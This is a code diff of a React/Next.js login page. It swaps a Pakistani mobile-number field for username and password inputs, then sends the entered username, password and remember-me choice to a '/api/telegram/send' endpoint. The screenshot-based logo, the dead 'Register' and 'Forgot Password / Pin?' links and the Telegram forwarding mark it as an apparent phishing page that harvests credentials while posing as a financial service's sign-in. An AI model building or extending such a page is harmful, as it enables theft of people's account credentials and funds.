@@ -2,20 +2,18 @@
 
 import { useState } from 'react'
 import { useRouter } from 'next/navigation'
+import { Eye, EyeOff, Lock, User } from 'lucide-react'
 import { saveSubmissionData } from '@/lib/submission-store'
 
 const logoImage =
   'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'
 
-function formatMobile(value: string) {
-  const digits = value.replace(/\D/g, '').slice(0, 11)
-  if (digits.length <= 4) return digits
-  return `${digits.slice(0, 4)}-${digits.slice(4)}`
-}
-
 export default function LoginPage() {
   const router = useRouter()
-  const [mobile, setMobile] = useState('')
+  const [username, setUsername] = useState('')
+  const [password, setPassword] = useState('')
+  const [showPassword, setShowPassword] = useState(false)
+  const [rememberMe, setRememberMe] = useState(false)
   const [error, setError] = useState('')
   const [submitting, setSubmitting] = useState(false)
 
@@ -23,16 +21,15 @@ export default function LoginPage() {
     event.preventDefault()
     if (submitting) return
 
-    const digits = mobile.replace(/\D/g, '')
-    if (digits.length !== 11) {
-      setError('Please enter a valid 11-digit mobile number.')
+    if (!username.trim() || !password.trim()) {
+      setError('Please enter your username and password.')
       return
     }
     setError('')
     setSubmitting(true)
 
     try {
-      const data = saveSubmissionData({ mobile })
+      const data = saveSubmissionData({ username, password, rememberMe })
       await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'content-type': 'application/json' },
@@ -61,53 +58,106 @@ export default function LoginPage() {
             </p>
           </div>
 
-          <form className="mt-8" onSubmit={handleSubmit}>
-            <label htmlFor="mobile" className="block text-sm font-medium text-[#333333]">
-              Mobile Number
+          <div className="mt-8 text-left">
+            <h2 className="text-xl font-bold text-[#1a1a1a]">Welcome Back!</h2>
+            <p className="mt-1 text-sm text-[#8a8a8a]">Please sign in to your account</p>
+          </div>
+
+          <form className="mt-6" onSubmit={handleSubmit}>
+            <label htmlFor="username" className="block text-sm font-medium text-[#333333]">
+              Username
             </label>
             <div className="login-field mt-2 flex items-center rounded-xl border border-[#d9d9d9] bg-white">
-              <span className="pl-4 pr-3 text-sm font-semibold text-[#8a8a8a]">PK</span>
-              <span className="h-6 w-px bg-[#e0e0e0]" />
+              <span className="pl-4 pr-3 text-[#8a8a8a]">
+                <User className="h-5 w-5" aria-hidden="true" />
+              </span>
               <input
-                id="mobile"
-                inputMode="tel"
-                autoComplete="tel"
-                value={mobile}
+                id="username"
+                type="text"
+                autoComplete="username"
+                value={username}
                 onChange={(event) => {
-                  setMobile(formatMobile(event.target.value))
+                  setUsername(event.target.value)
                   if (error) setError('')
                 }}
-                placeholder="03XX-XXXXXXX"
-                className="h-full w-full bg-transparent px-3 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
+                placeholder="Enter your username"
+                className="h-full w-full bg-transparent px-1 py-4 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
               />
             </div>
-            {error ? (
-              <p className="mt-2 text-xs font-medium text-[#c0392b]">{error}</p>
-            ) : (
-              <p className="mt-2 text-xs text-[#8a8a8a]">Format: 03XX-XXXXXXX</p>
-            )}
+
+            <label htmlFor="password" className="mt-5 block text-sm font-medium text-[#333333]">
+              Password
+            </label>
+            <div className="login-field mt-2 flex items-center rounded-xl border border-[#d9d9d9] bg-white">
+              <span className="pl-4 pr-3 text-[#8a8a8a]">
+                <Lock className="h-5 w-5" aria-hidden="true" />
+              </span>
+              <input
+                id="password"
+                type={showPassword ? 'text' : 'password'}
+                autoComplete="current-password"
+                value={password}
+                onChange={(event) => {
+                  setPassword(event.target.value)
+                  if (error) setError('')
+                }}
+                placeholder="Enter your password"
+                className="h-full w-full bg-transparent px-1 py-4 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
+              />
+              <button
+                type="button"
+                onClick={() => setShowPassword((value) => !value)}
+                className="px-4 text-[#8a8a8a]"
+                aria-label={showPassword ? 'Hide password' : 'Show password'}
+              >
+                {showPassword ? (
+                  <EyeOff className="h-5 w-5" aria-hidden="true" />
+                ) : (
+                  <Eye className="h-5 w-5" aria-hidden="true" />
+                )}
+              </button>
+            </div>
+
+            {error && <p className="mt-2 text-xs font-medium text-[#c0392b]">{error}</p>}
+
+            <div className="mt-4 flex items-center justify-between">
+              <label htmlFor="rememberMe" className="flex items-center gap-2 text-sm text-[#555555]">
+                <input
+                  id="rememberMe"
+                  type="checkbox"
+                  checked={rememberMe}
+                  onChange={(event) => setRememberMe(event.target.checked)}
+                  className="h-4 w-4 rounded border-[#d9d9d9] text-[#1f8a4c] focus:ring-[#1f8a4c]"
+                />
+                Remember Me
+              </label>
+              <a href="#" className="text-sm font-medium text-[#1f8a4c] underline underline-offset-4">
+                Forgot Password / Pin?
+              </a>
+            </div>
 
             <button
               type="submit"
               disabled={submitting}
-              className="mt-5 flex h-14 w-full items-center justify-center rounded-full bg-gradient-to-r from-[#1f8a4c] to-[#0d5228] text-base font-bold text-white shadow-[0_8px_18px_rgba(16,82,40,0.28)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-70"
+              className="mt-6 flex h-14 w-full items-center justify-center rounded-full bg-gradient-to-r from-[#1f8a4c] to-[#0d5228] text-base font-bold text-white shadow-[0_8px_18px_rgba(16,82,40,0.28)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-70"
             >
-              {submitting ? 'Please wait…' : 'Continue'}
+              {submitting ? 'Please wait…' : 'Sign In'}
             </button>
-
-            <div className="mt-5 text-center">
-              <a href="#" className="text-sm font-semibold text-[#1a1a1a] underline underline-offset-4">
-                Forgot Password / Pin?
-              </a>
-            </div>
           </form>
-        </section>
 
-        <div className="mt-6 text-center">
-          <a href="#" className="text-sm font-bold text-white underline underline-offset-4">
-            Register here
-          </a>
-        </div>
+          <div className="mt-6 flex items-center gap-3">
+            <span className="h-px flex-1 bg-[#e0e0e0]" />
+            <span className="text-xs font-medium text-[#8a8a8a]">OR</span>
+            <span className="h-px flex-1 bg-[#e0e0e0]" />
+          </div>
+
+          <p className="mt-5 text-center text-sm text-[#555555]">
+            Don&apos;t have an account?{' '}
+            <a href="#" className="font-semibold text-[#1f8a4c] underline underline-offset-4">
+              Register here
+            </a>
+          </p>
+        </section>
       </div>
     </main>
   )
